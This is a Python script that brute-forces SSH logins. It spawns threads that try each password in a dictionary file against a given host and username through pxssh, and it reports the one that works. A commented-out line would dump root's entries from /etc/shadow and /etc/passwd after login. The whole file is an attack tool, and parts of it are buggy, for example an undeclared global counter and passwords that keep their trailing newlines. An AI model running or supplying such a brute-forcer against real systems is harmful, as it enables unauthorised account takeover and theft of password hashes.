import socket
from pexpect import pxssh
import optparse
import time
from threading import *
maxConnections = 5
Found = False
Fails = 0
connection_lock = BoundedSemaphore(value=maxConnections)
import os



def send_command(connection, cmd):
	connection.sendline(cmd)
	connection.prompt()
	print(connection.before)
	connection.close()
	exit()
	

def main_connect(user, ipaddress, p_word, release):
	try:
		session = pxssh.pxssh()
		print()
		print('[*]Connecting with password: ' + p_word)
		session.login(ipaddress, user, p_word)
	except Exception as e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			main_connect(user, ipaddress, p_word, False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			main_connect(user, ipaddress, p_word, False)
		else:
			if release:
				connection_lock.release()
	else:
		print('[+]' + p_word + 'is the correct password')
		print('Connection successful')
		#return session
		session.close()
		os._exit(0)
		

def main():
	parser = optparse.OptionParser('-u <username> -a <hostname/ip_address> -f <dictionary>')
	parser.add_option('-a', type='string', dest='ip_address', help='Enter a valid hostname/ip_addres')
	parser.add_option('-u', type='string', dest='username', help='Enter a valid username')
	parser.add_option('-f', type='string', dest='dictionary', help='Enter authentiation password')
	parser.usage = '[+]Run: python [script.py] -u <username> -a <ip_address/hostname> -f <dictionary>'
	(options, args) = parser.parse_args()
	if (options.username == None) or (options.ip_address == None) or (options.dictionary == None):
		print(parser.usage)
		exit()
	else:
		username = options.username
		ip_address = options.ip_address
		dictionary = options.dictionary
		
	try:	
		ipaddress = socket.gethostbyname(ip_address)
	except:
		print('Ip address of '+ ipaddress + ' could not be resolved')
		exit()
	else:
		print('The ip-address of "' +ip_address + '" is: ' + ipaddress)
	
	#command = 'cat /etc/shadow | grep root; cat /etc/passwd | grep root'
	try:
		password_file = open(dictionary)
	except:
		print('[-]Dictionary file not found.')
		exit()
	for line in password_file.readlines():
		word = line.strip(' ')
		if Fails > 5:
			print('[!]Exiting: Too many socket Timeouts.')
			exit()
		connection_lock.acquire()
		t = Thread(target=main_connect, args=(username, ip_address, word, True))
		child = t.start()
		#connect_host = main_connect(username, ip_address, word)
	#send_command(connect_host, command)
	

if __name__ == '__main__':
	main()
